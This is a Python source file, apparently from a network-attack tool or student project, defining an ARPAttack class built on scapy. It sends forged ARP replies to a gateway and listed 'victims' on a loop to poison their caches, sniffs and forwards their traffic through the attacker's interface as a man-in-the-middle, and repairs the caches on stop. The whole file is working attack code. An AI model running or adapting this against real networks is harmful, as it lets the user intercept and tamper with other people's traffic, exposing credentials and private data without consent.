from threading import Thread
from time import sleep
from scapy.all import ARP, Ether, IP, ICMP, sendp, send, sr, TCP
from entities import Host, Interface
from util import Sniffer

class ARPAttack:
    def __init__(self,
            interface: Interface,
            gateway: Host = None,
            victims: list[Host] = [],
            interval: int = 10):

        if gateway is None:
            raise ValueError('There is no gateway selected')
        if len(victims) == 0:
            raise ValueError('There are no victims selected')

        self.interface = interface
        self.gateway = gateway
        self.victims = victims
        self.interval = interval
        self.active = False

    def start(self):
        self.active = True
        # We don't need to keep a reference to this thread because the thread will stop automatically
        Thread(target = self.poison_cache).start()
        self.sniffing_thread = Sniffer(self.interface, self.forward_packet)
        self.sniffing_thread.start()

    def stop(self):
        self.sniffing_thread.join()
        self.repair_cache()
        self.active = False

    def forward_packet(self, packet):
        # We cannot forward packets if we cannot see to where it is supposed to go
        if not (packet.haslayer(Ether) and packet.haslayer(IP)):
            return

        # Don't look at packets not addressed to us
        if packet.haslayer(Ether) and packet[Ether].dst != self.interface.mac_address.lower():
            return

        # We're not forwarding packets of our own
        if packet[IP].src == self.interface.ip_address:
            return

        # victim -> gateway
        if packet[IP].dst != self.interface.ip_address:
            # print('Forwarding the following packet to the gateway')
            # packet.show()
            packet[Ether].dst = self.gateway.mac_address
            packet[Ether].src = self.interface.mac_address
            sendp(packet, verbose=0, iface=self.interface.name)
            return

        # gateway -> victim
        for victim in self.victims:
            if packet[IP].dst == victim.ip_address:
                # print('Forwarding the following packet to the victim')
                # packet.show()
                packet[Ether].dst = victim.mac_address
                packet[Ether].src = self.interface.mac_address
                sendp(packet, verbose=0)
                return

    def ping(self):
        for victim in self.victims:
            ping = IP() / ICMP()
            ping[IP].src = victim.ip_address
            ping[IP].dst = self.gateway.ip_address
            sr(ping, iface=self.interface.name, timeout=1, verbose=0)

            ping = IP() / ICMP()
            ping[IP].src = self.gateway.ip_address
            ping[IP].dst = victim.ip_address
            sr(ping, iface=self.interface.name, timeout=1, verbose=0)

    def poison_cache(self):
        # The victims and gateway need to know of each others existence before
        # the attack can be performed (or so it seems, at least)
        self.ping()

        while True:
            if not self.active:
                return

            for victim in self.victims:
                packet = Ether() / ARP()
                packet[Ether].src = self.interface.mac_address
                packet[Ether].dst = self.gateway.mac_address
                packet[ARP].psrc = victim.ip_address
                packet[ARP].hwsrc = self.interface.mac_address
                packet[ARP].pdst = self.gateway.ip_address
                packet[ARP].hwdst = self.gateway.mac_address
                packet[ARP].op = 2
                sendp(packet, iface=self.interface.name, verbose=0)

                packet = Ether() / ARP()
                packet[Ether].src = self.interface.mac_address
                packet[Ether].dst = victim.mac_address
                packet[ARP].psrc = self.gateway.ip_address
                packet[ARP].hwsrc = self.interface.mac_address
                packet[ARP].pdst = victim.ip_address
                packet[ARP].hwdst = victim.mac_address
                packet[ARP].op = 2
                sendp(packet, iface=self.interface.name, verbose=0)
            sleep(self.interval)

    def repair_cache(self):
        for victim in self.victims:
            packet = Ether() / ARP()
            packet[Ether].src = self.interface.mac_address
            packet[Ether].dst = self.gateway.mac_address
            packet[ARP].psrc = victim.ip_address
            packet[ARP].hwsrc = victim.mac_address
            packet[ARP].pdst = self.gateway.ip_address
            packet[ARP].hwdst = self.gateway.mac_address
            packet[ARP].op = 2
            sendp(packet, iface=self.interface.name, verbose=0)

            packet = Ether() / ARP()
            packet[Ether].src = self.interface.mac_address
            packet[Ether].dst = victim.mac_address
            packet[ARP].psrc = self.gateway.ip_address
            packet[ARP].hwsrc = self.gateway.mac_address
            packet[ARP].pdst = victim.ip_address
            packet[ARP].hwdst = victim.mac_address
            packet[ARP].op = 2
            sendp(packet, iface=self.interface.name, verbose=0)
